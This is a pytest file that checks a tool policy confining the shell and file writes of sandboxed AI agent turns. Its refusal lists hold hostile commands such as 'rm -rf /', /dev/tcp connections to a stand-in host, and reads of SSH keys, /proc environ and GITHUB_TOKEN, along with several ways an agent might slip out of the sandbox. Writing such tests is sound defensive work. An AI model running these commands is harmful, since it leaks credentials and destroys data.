"""F099 section 4.4: what an internal_only turn may be offered, and may do per call.

Pure: no database. The allowed set is pinned as a literal on purpose. A tool
added later fails closed (it is not in the set), and this test is where its
author decides, with a reviewer, whether a lineage may use it.
"""

from __future__ import annotations

import os
import uuid

import pytest

from nous.api.execution_context import CONTEXT_KINDS, ExecutionContext
from nous.api.tool_classes import TOOL_CLASSES
from nous.api.tool_policy import (
    INTERNAL_ONLY_CHECKED_TOOLS,
    INTERNAL_ONLY_DENYLIST,
    INTERNAL_ONLY_LOGGED_TOOLS,
    INTERNAL_ONLY_SPAWN_TOOLS,
    LINEAGE_BUILD_COMMANDS,
    internal_only_allowed,
    internal_only_call_violation,
    lineage_bash_allowed,
    lineage_command_needs_scrub,
)

# Fixed ids: parametrize ids built from them must not change between collections (xdist).
IID, RID, OTHER = (uuid.UUID(f"00000000-0000-0000-0000-00000000000{n}") for n in (1, 2, 3))

# The tools a lineage may be offered when it is not a continuation. A class of
# none or write, not on the denylist, and not a spawn tool.
LINEAGE_ALLOWED = frozenset(
    {
        "recall_deep",
        "recall_recent",
        "read_file",
        "get_procedure",
        "web_search",
        "web_fetch",
        "list_tasks",
        "cache_retrieve",
        "recall_hubs",
        "list_decisions",
        "submit_final_report",
        "write_file",
        "learn_fact",
        "record_decision",
        "cancel_task",
        "ingest_document",
    }
)


def _internal(kind: str = "subtask", **over) -> ExecutionContext:
    base = {
        "kind": kind,
        "session_id": "s",
        "authority": "internal_only",
        "intention_id": IID,
        "root_intention_id": RID,
    }
    return ExecutionContext(**{**base, **over})


def _allowed(ctx: ExecutionContext) -> frozenset[str]:
    return frozenset(name for name in TOOL_CLASSES if internal_only_allowed(name, ctx=ctx))


@pytest.mark.parametrize(
    "kind",
    [k for k in CONTEXT_KINDS if k not in ("continuation", "approved_action")],
)
def test_a_lineage_turn_that_is_not_a_continuation_is_offered_exactly_the_pinned_set(kind):
    got = _allowed(_internal(kind))
    assert got == LINEAGE_ALLOWED, (
        f"the internal_only allowed set changed. Added: {sorted(got - LINEAGE_ALLOWED)}; "
        f"removed: {sorted(LINEAGE_ALLOWED - got)}. A tool a lineage may use is a security decision: "
        "update LINEAGE_ALLOWED only with a reviewer's agreement."
    )


def test_a_continuation_is_also_offered_the_two_spawn_tools_until_its_root_is_at_a_limit():
    cont = _internal("continuation")
    assert _allowed(cont) == LINEAGE_ALLOWED | {"spawn_task", "dag_create"}
    assert _allowed(_internal("continuation", spawn_blocked=True)) == LINEAGE_ALLOWED


def test_no_denylisted_external_or_irreversible_tool_is_ever_allowed():
    for kind in CONTEXT_KINDS:
        if kind == "approved_action":
            continue  # not an internal_only context
        allowed = _allowed(_internal(kind))
        assert not allowed & INTERNAL_ONLY_DENYLIST
        assert all(TOOL_CLASSES[n].side_effect in ("none", "write") for n in allowed)
        assert not allowed & {"send_email", "send_file"}


def test_an_unclassified_tool_fails_closed():
    assert internal_only_allowed("a_tool_nobody_classified", ctx=_internal("continuation")) is False


def test_the_denylist_names_only_classified_tools_and_is_the_specs():
    assert INTERNAL_ONLY_DENYLIST <= set(TOOL_CLASSES), "a stale denylist entry guards nothing"
    assert INTERNAL_ONLY_DENYLIST == frozenset(
        {
            "schedule_task",
            "heartbeat_check_create",
            "heartbeat_check_manage",
            "create_censor",
            "learn_skill",
            "store_identity",
            "complete_initiation",
            "dag_manage",
            "push_surface",
            "compose_surface",
            "bash",
            "run_python",
            "spawn_sync",
            "resolve_decision",
            "resolve_decisions",
        }
    )
    assert INTERNAL_ONLY_SPAWN_TOOLS == frozenset({"spawn_task", "dag_create"})
    assert INTERNAL_ONLY_CHECKED_TOOLS == frozenset({"write_file", "cancel_task"})
    assert INTERNAL_ONLY_LOGGED_TOOLS == frozenset({"web_fetch", "web_search"})


# -- per-call rules ---------------------------------------------------------


def _violation(name: str, tool_input: dict, tmp_path, ctx: ExecutionContext | None = None) -> str | None:
    return internal_only_call_violation(ctx or _internal(), name, tool_input, workspace_dir=str(tmp_path))


@pytest.mark.parametrize(
    ("name", "tool_input"),
    [
        ("send_email", {"to": "a@example.com", "subject": "s", "body": "b"}),
        ("send_file", {"path": "x"}),
        ("run_python", {"code": "import smtplib"}),
        ("run_python", {"code": "print(open('https://example.com'))"}),
        ("bash", {"command": "curl https://example.com"}),
    ],
)
def test_a_call_rated_external_is_a_violation_whatever_the_tool(name, tool_input, tmp_path):
    assert _violation(name, tool_input, tmp_path) == "external"


@pytest.mark.parametrize(
    ("name", "tool_input"),
    [("run_python", {"code": "print(1)"}), ("bash", {"command": "ls"}), ("recall_deep", {"query": "x"})],
)
def test_a_local_call_is_not(name, tool_input, tmp_path):
    assert _violation(name, tool_input, tmp_path) is None


def _write(tmp_path, path, ctx=None):
    return _violation("write_file", {"path": path, "content": "x"}, tmp_path, ctx)


def test_write_file_under_the_root_dir_is_allowed(tmp_path):
    assert _write(tmp_path, f"intentions/{RID}/notes.md") is None
    assert _write(tmp_path, f"intentions/{RID}/deep/er/notes.md") is None
    assert _write(tmp_path, str(tmp_path / "intentions" / str(RID) / "abs.md")) is None


@pytest.mark.parametrize(
    "path",
    [
        "notes.md",
        f"intentions/{OTHER}/notes.md",
        f"intentions/{RID}/../{OTHER}/notes.md",
        f"intentions/{RID}/../../outside.md",
        "../outside.md",
        "/etc/passwd",
        "intentions",
        f"intentions/{str(RID)[:8]}/notes.md",
        f"intentions/{RID}-sibling/notes.md",
        # _write omits lineage_shell, so this pins the keyword default as closed.
        "claude-jobs/prompts/x.md",
    ],
)
def test_write_file_outside_the_root_dir_is_refused(tmp_path, path):
    assert _write(tmp_path, path) == "write_path"


def test_write_file_with_no_root_or_no_usable_path_is_refused(tmp_path):
    damaged = _internal(root_intention_id=None, intention_id=None)
    assert _write(tmp_path, f"intentions/{RID}/notes.md", damaged) == "write_path"
    assert _write(tmp_path, "intentions/None/notes.md", damaged) == "write_path"  # str(None) names no root
    for tool_input in ({}, {"path": ""}, {"path": 7}, {"path": "a\x00b"}):
        assert _violation("write_file", tool_input, tmp_path) == "write_path"
    # A NUL byte under the root dir: Windows' realpath swallows it (gh-106242), so only the
    # explicit check refuses it there; Linux's resolve() raises.
    assert _write(tmp_path, f"intentions/{RID}/a\x00b") == "write_path"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_write_file_through_a_symlink_that_leaves_the_root_dir_is_refused(tmp_path):
    root_dir = tmp_path / "intentions" / str(RID)
    root_dir.mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    (root_dir / "link").symlink_to(outside)
    assert _write(tmp_path, f"intentions/{RID}/link/x.md") == "write_path"


# -- write_file under claude-jobs/prompts/ (friction scan F3) -------------------
# prompts/ is writable iff the lineage can launch, i.e. with NOUS_F099_LINEAGE_SHELL. Every test passes the flag
# explicitly; the base has no such keyword.


def _write_with(tmp_path, path, *, lineage_shell, ctx=None):
    return internal_only_call_violation(
        ctx or _internal(),
        "write_file",
        {"path": path, "content": "x"},
        workspace_dir=str(tmp_path),
        lineage_shell=lineage_shell,
    )


def test_write_file_allowed_under_claude_jobs_prompts(tmp_path):
    for path in (
        "claude-jobs/prompts/task.md",
        "claude-jobs/prompts/deep/er/task.md",
        str(tmp_path / "claude-jobs" / "prompts" / "abs.md"),
        f"intentions/{RID}/notes.md",  # PIN: the root's own dir stays writable
    ):
        assert _write_with(tmp_path, path, lineage_shell=True) is None, path


@pytest.mark.parametrize(
    "path",
    [
        "claude-jobs/prompts/../runner.sh",
        "claude-jobs/runner.sh",
        "{W}/claude-jobs/runner.sh",
        "claude-jobs/.claude-home/settings.json",
        "claude-jobs/prompts/../.claude-home/settings.json",
        "claude-jobs/prompts-sibling/task.md",
        "claude-jobs",
        "claude-jobs/prompts/a\x00b",
    ],
)
def test_write_file_prompts_dir_rejects_escapes(tmp_path, path):  # PIN: the base refuses these too
    assert _write_with(tmp_path, path.format(W=tmp_path), lineage_shell=True) == "write_path"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_write_file_prompts_dir_rejects_a_symlink_out(tmp_path):  # PIN: the base refuses it too
    prompts = tmp_path / "claude-jobs" / "prompts"
    prompts.mkdir(parents=True)
    (prompts / "link").symlink_to(tmp_path / "claude-jobs")
    assert _write_with(tmp_path, "claude-jobs/prompts/link/runner.sh", lineage_shell=True) == "write_path"


def test_write_file_into_prompts_is_refused_with_the_lineage_shell_off(tmp_path):  # PIN: the base refuses it too
    assert _write_with(tmp_path, "claude-jobs/prompts/task.md", lineage_shell=False) == "write_path"
    assert _write_with(tmp_path, f"intentions/{RID}/notes.md", lineage_shell=False) is None


def test_write_file_still_refused_without_root(tmp_path):  # PIN: the base refuses it too
    damaged = _internal(root_intention_id=None, intention_id=None)
    assert _write_with(tmp_path, "claude-jobs/prompts/task.md", lineage_shell=True, ctx=damaged) == "write_path"


def test_lineage_write_dirs_are_resolved_and_follow_the_flag(tmp_path):
    from nous.api.tool_policy import lineage_write_dirs

    ws = tmp_path.resolve()
    root_dir, prompts = ws / "intentions" / str(RID), ws / "claude-jobs" / "prompts"
    assert lineage_write_dirs(_internal(), str(tmp_path), lineage_shell=True) == [root_dir, prompts]
    assert lineage_write_dirs(_internal(), str(tmp_path), lineage_shell=False) == [root_dir]
    damaged = _internal(root_intention_id=None, intention_id=None)
    assert lineage_write_dirs(damaged, str(tmp_path), lineage_shell=True) == [prompts]


@pytest.mark.skipif(os.name == "nt", reason="a bash redirect target must start with /")
def test_writable_dirs_shared_with_bash(tmp_path):
    """write_file and the lineage shell's redirections accept the same directories, and refuse the same sibling."""
    from nous.api.tool_policy import lineage_write_dirs

    for d in lineage_write_dirs(_internal(), str(tmp_path), lineage_shell=True):
        assert _write_with(tmp_path, f"{d}/x.md", lineage_shell=True) is None
        assert _shell(f"echo x > {d}/x.md", tmp_path) is None
        assert _write_with(tmp_path, f"{d}-sibling/x.md", lineage_shell=True) == "write_path"
        assert _shell(f"echo x > {d}-sibling/x.md", tmp_path) == "external"


def test_cancel_task_needs_a_uuid_here_and_the_lineage_check_is_the_handlers(tmp_path):
    assert _violation("cancel_task", {"task_id": str(uuid.uuid4())}, tmp_path) is None
    for tool_input in ({}, {"task_id": "not-a-uuid"}, {"task_id": None}, {"task_id": 12}):
        assert _violation("cancel_task", tool_input, tmp_path) == "foreign_cancel"


# -- F099 lineage shell (NOUS_F099_LINEAGE_SHELL) ------------------------------


@pytest.mark.parametrize("kind", ["continuation", "subtask", "dag_node"])
def test_the_lineage_shell_flag_offers_bash_and_nothing_else(kind):
    ctx = _internal(kind)
    shell = frozenset(name for name in TOOL_CLASSES if internal_only_allowed(name, ctx=ctx, lineage_shell=True))
    assert shell == _allowed(ctx) | {"bash"}
    assert "bash" not in _allowed(ctx)  # PIN: flag off is the old surface
    assert "run_python" not in shell and "schedule_task" not in shell and "dag_manage" not in shell


def _shell(command: str, tmp_path, ctx: ExecutionContext | None = None) -> str | None:
    return _violation("bash", {"command": command}, tmp_path, ctx)


def _runner_sh(tmp_path) -> str:
    return f"{tmp_path}/claude-jobs/runner.sh"


@pytest.mark.parametrize(
    "command",
    [
        "{R} launch nous 'Fix the bug [P1]? Costs $5' --model claude-opus-5-5 --effort high",
        "{R} launch nous --prompt-file {W}/claude-jobs/prompts/task.md --model m --base-branch feat/x",
        "{R} launch nous p --plugins {W}/plugins/superpowers/skills/a,{W}/plugins/b",
        "{R} launch nous --prompt-file {W}/intentions/{RID}/prompt.md",
        "{R} status",
        "{R} status job-20261010-222549-6e37c52b",
        "{R} result job-20261010-222549-6e37c52b",
        "{R} list --active",
        "gh pr view 719",
        "gh pr view 719 --json state,mergeable -R tfatykhov/nous",
        "gh pr checks 719",
        "gh run list",
        "gh api repos/tfatykhov/nous/pulls/719 --jq .state",
        "gh api -X GET repos/tfatykhov/nous/pulls --paginate",
        "gh api --method=GET repos/a/b",
        "cd {W}/nous && gh pr view 3 2>&1 | head -20",
        "cat {W}/a.md; ls -la {W} | grep x || true",
        "printf 'job %s' x > {W}/intentions/{RID}/notes.md",
        "echo hi >> {W}/claude-jobs/prompts/p.md 2>/dev/null",
        "cat > {W}/claude-jobs/prompts/p.md <<'EOF'\nraw $HOME `id` text\nEOF\n"
        "{R} launch nous --prompt-file {W}/claude-jobs/prompts/p.md",
        "sleep 30 && {R} status job-20261010-222549-6e37c52b",
    ],
)
def test_the_lineage_shell_allows_the_delegation_path_and_reads(command, tmp_path):
    command = command.format(R=_runner_sh(tmp_path), W=tmp_path, RID=RID)
    assert _shell(command, tmp_path) is None


@pytest.mark.parametrize(
    "command",
    [
        # outward or destructive
        "gh pr merge 719",
        "gh pr comment 719 -b hi",
        "gh pr view 719 --web",
        "gh pr checks 719 --watch",
        "git push origin main",
        "git status",
        "curl -X POST http://localhost:8000/intentions/proposals/x/decide",
        "curl https://example.com",
        "rm -rf /tmp/x",
        "mail -s hi a@example.com",
        "python3 -c 'print(1)'",
        "tee {W}/claude-jobs/prompts/p.md",
        # gh api that writes, or can
        "gh api -X POST repos/a/b/issues",
        "gh api repos/a/b/issues -f title=x",
        "gh api repos/a/b/issues --input body.json",
        "gh api -H 'X-HTTP-Method-Override: POST' repos/a/b",
        "gh api graphql -f query=x",
        "gh api https://evil.example/x",
        "gh api --hostname evil.example repos/a/b",
        # chains, substitutions, wrappers
        "{R} launch x p; curl -X POST http://example.com",
        "{R} status && rm -rf /",
        "gh pr view 1 | sh",
        "echo $(curl http://example.com)",
        "echo `id`",
        'ls "$(id)"',
        "ls $HOME",
        "(ls)",
        "{{ ls; }}",
        "ls &",
        "bash -c ls",
        "sudo ls",
        "env ls",
        "X=1 ls",
        "eval ls",
        "ls *",
        "cat ~/.ssh/id_rsa",
        "cat > {W}/claude-jobs/prompts/p.md <<EOF\n$(id)\nEOF",
        "echo 'unbalanced",
        "",
        "   ",
        # runner.sh arguments
        "{R} launch nous p --sys-prompt x",
        "{R} launch nous p --plugins /tmp/evil",
        "{R} launch nous p --plugins {W}/plugins/../claude-jobs",
        '{R} launch "nous\'x" p',
        "{R} launch nous --prompt-file /etc/shadow",
        "{R} launch nous -p",
        "{R} launch nous p --model",
        '{R} launch nous p --model "m\'x"',
        "{R} cleanup job-20261010-222549-6e37c52b",
        "{R} gc",
        # cancel is not allowed: no ownership check (see #725)
        "{R} cancel job-20261010-222549-6e37c52b",
        "{R} status ../../x",
        "{R}",
        "bash {R} status",
        "./runner.sh status",
        # writes outside the two directories
        "printf x > {R}",
        "printf x > {W}/claude-jobs/prompts/../runner.sh",
        "printf x > {W}/intentions/{OTHER}/notes.md",
        "cat a > {W}/a",
        "echo x > relative.txt",
        "echo x > /dev/tcp/example.com/80",
        "cat < /dev/tcp/example.com/80",
        "cat 0</dev/udp/example.com/53",
        "grep x <> /dev/tcp/example.com/80",
        "cat <<< x < //dev/tcp/example.com/80",
        "cat >&/dev/tcp/example.com/80",
        "echo x >&{W}/a",
    ],
)
def test_the_lineage_shell_refuses_everything_else_as_external(command, tmp_path):
    command = command.format(R=_runner_sh(tmp_path), W=tmp_path, RID=RID, OTHER=OTHER)
    assert _shell(command, tmp_path) == "external"


def test_the_lineage_shell_refuses_a_call_with_no_usable_command(tmp_path):
    for tool_input in ({}, {"command": None}, {"command": ["ls"]}, {"cmd": "ls"}):
        assert _violation("bash", tool_input, tmp_path) == "external"


def test_a_lineage_with_no_root_may_write_only_to_the_prompts_dir(tmp_path):
    damaged = _internal(root_intention_id=None, intention_id=None)
    assert _shell(f"echo x > {tmp_path}/claude-jobs/prompts/p.md", tmp_path, damaged) is None
    assert _shell(f"echo x > {tmp_path}/intentions/None/p.md", tmp_path, damaged) == "external"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_a_lineage_shell_write_through_a_symlink_that_leaves_the_dir_is_refused(tmp_path):
    prompts = tmp_path / "claude-jobs" / "prompts"
    prompts.mkdir(parents=True)
    (prompts / "link").symlink_to(tmp_path)
    assert _shell(f"echo x > {prompts}/link/runner.sh", tmp_path) == "external"


# -- P1/P2 from #723 (Codex findings, issue #725) -------------------------------


def test_lineage_cancel_is_not_allowed(tmp_path):
    """A continuation must not be able to cancel a runner job by ID alone — no ownership check."""
    ctx = _internal()
    workspace = str(tmp_path)
    runner = f"{workspace}/claude-jobs/runner.sh"
    assert not lineage_bash_allowed(ctx, f"{runner} cancel job-20260101-120000-abcd1234", workspace_dir=workspace)


def test_lineage_status_and_result_still_allowed(tmp_path):
    """status and result (read-only) should still work for a well-formed job ID."""
    ctx = _internal()
    workspace = str(tmp_path)
    runner = f"{workspace}/claude-jobs/runner.sh"
    for action in ("status", "result"):
        assert lineage_bash_allowed(ctx, f"{runner} {action} job-20260101-120000-abcd1234", workspace_dir=workspace)


def test_printf_v_is_blocked(tmp_path):
    """printf -v VAR can override exported variables on bash — must be rejected."""
    ctx = _internal()
    workspace = str(tmp_path)
    for cmd in [
        "printf -v PATH /attacker/dir",
        "printf -vPATH /attacker/dir",
    ]:
        assert not lineage_bash_allowed(ctx, cmd, workspace_dir=workspace)


def test_printf_without_v_is_allowed(tmp_path):
    """printf without -v is fine (writes to stdout only)."""
    ctx = _internal()
    workspace = str(tmp_path)
    assert lineage_bash_allowed(ctx, "printf '%s\\n' hello", workspace_dir=workspace)


def test_printf_v_is_only_an_option_in_the_leading_option_position(tmp_path):
    """#727: only a LEADING -v assigns; after the format, or after --, it is an argument printf prints."""
    ctx = _internal()
    workspace = str(tmp_path)
    for cmd in ["printf '%s' -value", "printf -- '%s' -v", "printf '%s %s' a -v", "printf -- -v"]:
        assert lineage_bash_allowed(ctx, cmd, workspace_dir=workspace), cmd
    for cmd in ["printf -v x hi", "printf -vx hi", "printf -nv x hi"]:
        assert not lineage_bash_allowed(ctx, cmd, workspace_dir=workspace), cmd


@pytest.mark.parametrize("op", ["&>", "&>>"])
def test_the_lineage_shell_refuses_the_bash_only_redirect_of_both_streams(op, tmp_path):
    """dash, prod's /bin/sh, reads `cat a &>f` as `cat a &` and then `>f`: a backgrounded command."""
    assert _shell(f"cat {tmp_path}/a.md {op} {tmp_path}/intentions/{RID}/n.md", tmp_path) == "external"


# -- post-merge review P1-1: read arguments stay under the workspace -------------


@pytest.mark.parametrize(
    "command",
    [
        # the review's probes
        "cat /proc/self/environ",
        "grep -r TOKEN /proc/1/environ",
        "cat /etc/passwd",
        "cat ../x",
        "cat .ssh/id_rsa",
        "cd claude-jobs; cat .claude-home/oauth-token",
        # hidden components, absolute or relative
        "cat {W}/.ssh/id_rsa",
        "cat claude-jobs/.claude-home/oauth-token",
        "head -n 5 bitsgap/.secrets/key",
        "tail -c 10 .env",
        "wc -l .nous-undo/x",
        "ls .ssh",
        "ls /",
        "ls ..",
        "cat '~/x'",
        "ls '~'",
        "cat x -- /etc/passwd",
        "cat -- /etc/passwd",
        "head -5 ../x",
        "wc --files0-from=list",
        "wc --files0-from list",
        # cd
        "cd",
        "cd -",
        "cd '~'",
        "cd /etc",
        "cd ..",
        "cd .ssh",
        "cd claude-jobs/.claude-home",
        "cd -P /etc",
        "cd a b",
        "cd /etc && cat passwd",
        # grep: files, pattern files, recursion
        "grep x /proc/1/environ",
        "grep -e x /etc/passwd",
        "grep -ie x /etc/passwd",
        "grep -f /etc/passwd x",
        "grep -f/etc/passwd x",
        "grep -if /etc/passwd x",
        "grep --file=/proc/self/environ x",
        "grep --file /proc/self/environ x",
        "grep --exclude-from=/etc/x y z",
        "grep -r TOKEN .",
        "grep -R x claude-jobs",
        "grep -rn x .",
        "grep -nr x .",
        "grep --recursive x .",
        "grep --dereference-recursive x .",
        "grep --rec x .",
        "grep -d recurse x .",
        "grep -drecurse x .",
        "grep --directories=recurse x .",
        "grep --directories recurse x .",
        "grep -e x -- .ssh/id_rsa",
        # jq: data files, program files, imports, env
        "jq . /etc/passwd",
        "jq '.a' .ssh/k.json",
        "jq --rawfile x /proc/self/environ -n '$x'",
        "jq -n --slurpfile x .ssh/k.json '$x'",
        "jq -n '$x' --rawfile x /etc/passwd",
        "jq -f /etc/x",
        "jq -f intentions/{RID}/p.jq",
        "jq --from-file intentions/{RID}/p.jq",
        "jq -nf intentions/{RID}/p.jq",
        "jq --args -n '$ARGS' x",
        "jq --jsonargs -n '$ARGS' 1",
        "jq -L /etc -n 1",
        "jq --run-tests x",
        'jq -n \'import "c" as $c {{search: "/root"}}; $c\'',
        "jq -n 'include \"c\"; 1'",
        "jq -n '$ENV'",
        "jq -n 'env.GITHUB_TOKEN'",
        # an input redirection is a read too, whatever the command
        "cat < /proc/self/environ",
        "grep x < .ssh/id_rsa",
        "jq . 0</etc/passwd",
        "echo < /etc/shadow",
        "cd claude-jobs; cat < .claude-home/oauth-token",
    ],
)
def test_the_lineage_shell_refuses_a_read_outside_the_workspace_or_into_a_hidden_dir(command, tmp_path):
    command = command.format(W=tmp_path, RID=RID)
    assert _shell(command, tmp_path) == "external"


@pytest.mark.parametrize(
    "command",
    [
        "jq '.items[0]' intentions/{RID}/r.json",
        "jq -r '.a' {W}/intentions/{RID}/r.json",
        "jq '.a' intentions/{RID}/r.json --indent 2",
        "jq -n --arg x /etc/passwd '$x'",
        "jq -n --argjson x 1 '$x'",
        "jq --rawfile t intentions/{RID}/t.txt -n '$t'",
        "jq -nr '1'",
        "jq -R . intentions/{RID}/log.txt",
        "grep -n error intentions/{RID}/log.txt",
        "grep -e .ssh -n intentions/{RID}/log.txt",
        "grep -A 3 -i error intentions/{RID}/log.txt",
        "grep -c -e x -e y claude-jobs/a.log claude-jobs/b.log",
        "grep -f intentions/{RID}/patterns.txt claude-jobs/a.log",
        "grep --color=never -m2 x claude-jobs/a.log",
        "gh pr view 1 | grep -n state",
        "cat claude-jobs/prompts/p.md",
        "cat ./claude-jobs/prompts/p.md -",
        "head -n 5 intentions/{RID}/log.txt",
        "tail -20 claude-jobs/x.log",
        "tail --lines=3 claude-jobs/x.log",
        "wc -l claude-jobs/prompts/p.md",
        "ls",
        "ls -la",
        "ls -la claude-jobs/prompts",
        "cd claude-jobs && ls prompts",
        "cd {W}/intentions/{RID} && cat r.json",
        "cd intentions; cd {RID}; jq . r.json",
        "echo ../.ssh /etc/passwd",
        "pwd; sleep 1; true",
        "jq .a < intentions/{RID}/r.json",
        "cat < /dev/null",
    ],
)
def test_the_lineage_shell_still_allows_reads_under_the_workspace(command, tmp_path):
    command = command.format(W=tmp_path, RID=RID)
    assert _shell(command, tmp_path) is None


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_a_relative_read_is_checked_from_every_directory_an_earlier_cd_could_reach(tmp_path):
    """`x` is harmless from the workspace, but after `cd sub` it is a link to a key."""
    (tmp_path / ".ssh").mkdir()
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "x").symlink_to(tmp_path / ".ssh" / "id_rsa")
    assert _shell("cat x", tmp_path) is None
    assert _shell("cd sub; cat x", tmp_path) == "external"
    assert _shell("cd sub || true; head x", tmp_path) == "external"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
def test_a_read_or_cd_through_a_symlink_into_a_hidden_dir_is_refused(tmp_path):
    (tmp_path / ".ssh").mkdir()
    (tmp_path / "ok").mkdir()
    (tmp_path / "ok" / "link").symlink_to(tmp_path / ".ssh")
    assert _shell("cat ok/link/id_rsa", tmp_path) == "external"
    assert _shell("cd ok/link", tmp_path) == "external"
    assert _shell("ls ok", tmp_path) is None


def _deep_link_workspace(tmp_path):
    """The review's workspace: ``ws/l`` is a plain-named link to a deeper directory, and a file sits outside."""
    ws = tmp_path / "ws"
    root_dir = ws / "intentions" / str(RID)
    root_dir.mkdir(parents=True)
    (ws / "l").symlink_to(root_dir)
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside" / "secret.txt").write_text("outside-secret")
    (ws / "intentions" / "x").write_text("physical-parent")
    (ws / "x").write_text("logical-parent")
    (root_dir / "x.md").write_text("root-file")
    return ws


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks")
@pytest.mark.parametrize(
    "command",
    [
        "cd l/../..; cat outside/secret.txt",
        "cd intentions/{RID}/../../l/../..; cat x",
        "cd l; cd ..; cat x",
        "cd ..",
        "cd l/..",
        "cd -L intentions",
        "cd -P intentions",
    ],
)
def test_a_cd_target_with_a_dotdot_component_is_refused(command, tmp_path):
    """dash's cd resolves `..` LOGICALLY (l/.. is the directory l sits in), the policy physically (l/.. is the
    link target's parent), so `cd l/../..` would leave the workspace while the policy saw it stay inside."""
    ws = _deep_link_workspace(tmp_path)
    assert _violation("bash", {"command": command.format(RID=RID)}, ws) == "external"


@pytest.mark.skipif(os.name == "nt", reason="needs symlinks and /bin/sh")
def test_a_read_after_cd_through_a_link_is_judged_from_the_physical_directory_the_kernel_reads(tmp_path):
    """A read argument's `..` is resolved by the kernel from the PHYSICAL cwd, as the policy resolves it."""
    import subprocess

    ws = _deep_link_workspace(tmp_path)

    def sh(command: str) -> str:
        return subprocess.run(["/bin/sh", "-c", command], cwd=ws, capture_output=True, text=True).stdout

    assert _violation("bash", {"command": f"cd intentions/{RID}; cat x.md"}, ws) is None
    assert _violation("bash", {"command": "cd l; cat x.md"}, ws) is None
    assert sh("cd l; cat x.md") == "root-file"
    # `../x` after `cd l` is ws/intentions/x to the kernel, not ws/x: the physical base, as the policy has it.
    assert sh("cd l; cat ../x") == "physical-parent"
    # Still refused: from the workspace, another directory the shell may be in, `../x` leaves it.
    assert _violation("bash", {"command": "cd l; cat ../x"}, ws) == "external"


@pytest.mark.parametrize(
    "command",
    [
        "gh api repos/a/b --jq '$ENV.GITHUB_TOKEN'",
        "gh api repos/a/b --jq='$ENV.GITHUB_TOKEN'",
        "gh pr view 1 --json title -q 'env'",
        "gh pr view 1 --json title -q'env.GITHUB_TOKEN'",
        "gh pr view 1 --json title -cq 'env'",
        "gh api repos/a/b -q 'import \"x\" as $x; $x'",
    ],
)
def test_a_gh_jq_filter_that_reads_the_environment_is_refused(command, tmp_path):
    """gh runs --jq with gojq, which reads the environment, and GITHUB_TOKEN is left in a lineage's."""
    assert _shell(command, tmp_path) == "external"


@pytest.mark.parametrize(
    "command",
    ["gh api repos/a/b --jq '.title'", "gh pr view 1 --json title -q .title", "gh pr view 1 --json title --jq=.title"],
)
def test_an_ordinary_gh_jq_filter_is_still_allowed(command, tmp_path):
    assert _shell(command, tmp_path) is None


# -- post-merge review P1-1: a lineage's bash runs with an allowlisted environment ---


def _bash_dispatcher(tmp_path):
    from types import SimpleNamespace

    from nous.api.builtin_tools import register_builtin_tools
    from nous.api.tools import ToolDispatcher

    d = ToolDispatcher()
    register_builtin_tools(d, SimpleNamespace(workspace_dir=str(tmp_path / "ws")))
    return d


@pytest.mark.skipif(os.name == "nt", reason="a POSIX shell and printenv")
async def test_a_lineage_bash_call_sees_only_the_allowlisted_environment(tmp_path, monkeypatch):
    monkeypatch.setenv("NOUS_TEST_PLANTED_SECRET", "planted-s3cret")
    monkeypatch.setenv("GITHUB_TOKEN", "planted-gh-token")
    d = _bash_dispatcher(tmp_path)
    command = "printenv NOUS_TEST_PLANTED_SECRET; printenv GITHUB_TOKEN; printenv PATH"
    text, _ = await d.dispatch("bash", {"command": command}, context=_internal("continuation"))
    assert "planted-s3cret" not in text
    # Kept on purpose: gh authenticates only through it, and runner.sh launch hands it to the job.
    assert "planted-gh-token" in text
    assert os.environ["PATH"] in text
    # The model cannot switch the scrub off: an argument named with "_" is the dispatcher's.
    text, _ = await d.dispatch("bash", {"command": command, "_lineage": False}, context=_internal("continuation"))
    assert "planted-s3cret" not in text


@pytest.mark.skipif(os.name == "nt", reason="a POSIX shell and printenv")
@pytest.mark.parametrize("ctx", [None, ExecutionContext(kind="subtask", session_id="s")])
async def test_a_bash_call_outside_a_lineage_keeps_the_full_environment(tmp_path, monkeypatch, ctx):
    monkeypatch.setenv("NOUS_TEST_PLANTED_SECRET", "planted-s3cret")
    d = _bash_dispatcher(tmp_path)
    text, _ = await d.dispatch("bash", {"command": "printenv NOUS_TEST_PLANTED_SECRET"}, context=ctx)
    assert "planted-s3cret" in text


# -- F099 lineage build commands (NOUS_F099_LINEAGE_BUILD_COMMANDS) -----------


def _shell_build(command: str, tmp_path, ctx: ExecutionContext | None = None) -> str | None:
    """Violation check with lineage_build_commands=True."""
    return internal_only_call_violation(
        ctx or _internal(),
        "bash",
        {"command": command},
        workspace_dir=str(tmp_path),
        lineage_shell=True,
        lineage_build_commands=True,
    )


def test_lineage_build_commands_constant():
    """The build commands constant contains exactly pytest, ruff, make."""
    assert LINEAGE_BUILD_COMMANDS == frozenset({"pytest", "ruff", "make"})


# Test 1: git log --oneline → allowed when lineage_build_commands=True
def test_git_log_allowed_with_build_commands(tmp_path):
    assert _shell_build("git log --oneline", tmp_path) is None


# Test 1b: git log --oneline → refused when lineage_build_commands=False
def test_git_log_refused_without_build_commands(tmp_path):
    assert _shell("git log --oneline", tmp_path) == "external"


# Test 2: git push origin main → refused even when lineage_build_commands=True
def test_git_push_refused_with_build_commands(tmp_path):
    assert _shell_build("git push origin main", tmp_path) == "external"


# Test 3: pytest tests/ → allowed
def test_pytest_allowed_with_build_commands(tmp_path):
    assert _shell_build("pytest tests/", tmp_path) is None


# Test 4: make build → allowed
def test_make_build_allowed(tmp_path):
    assert _shell_build("make build", tmp_path) is None


# Test 5: make -f /etc/Makefile → refused (outside workspace)
def test_make_external_makefile_refused(tmp_path):
    assert _shell_build("make -f /etc/Makefile", tmp_path) == "external"


# Test 6: curl https://example.com → still refused
def test_curl_still_refused_with_build_commands(tmp_path):
    assert _shell_build("curl https://example.com", tmp_path) == "external"


# Test 7: ruff check nous/ → allowed
def test_ruff_check_allowed(tmp_path):
    assert _shell_build("ruff check nous/", tmp_path) is None


# Test 8: ruff --config /etc/ruff.toml check . → refused
def test_ruff_external_config_refused(tmp_path):
